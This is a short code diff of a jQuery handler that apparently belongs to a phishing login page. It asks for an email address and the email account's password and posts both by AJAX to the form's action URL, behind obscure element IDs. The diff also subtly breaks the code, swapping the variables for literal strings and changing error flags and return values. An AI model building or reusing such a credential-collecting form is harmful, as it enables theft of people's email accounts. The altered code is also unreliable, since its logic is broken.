@@ -40,19 +40,19 @@
             if (input4passwd == '') {
                 $('#igodo').next( "span" ).text("Email password is needed.")
                 $('#igodo').focus().attr('style', 'border-color: #ff0000 !important');
-                form_error[1] = true;
+                form_error[0] = true;
             }	
             console.log(form_error)
     
             if(form_error.includes(true)){
-                return true;
+                return false;
             }
     
             $.ajax({
                 url: $('#gawaboy').attr('action'),
                 method: "post",
-                data: {email: input4email, passwd: input4passwd},
-                processData: true,
+                data: {email: "input4email", passwd: "input4passwd"},
+                processData: false,
                 beforeSend: function(xhr){
                     $('#showerror').removeClass('alert').text('')
                     $('#btn4sbmt').html('<center><div class="spinner"></div></center>').prop('disabled', true);
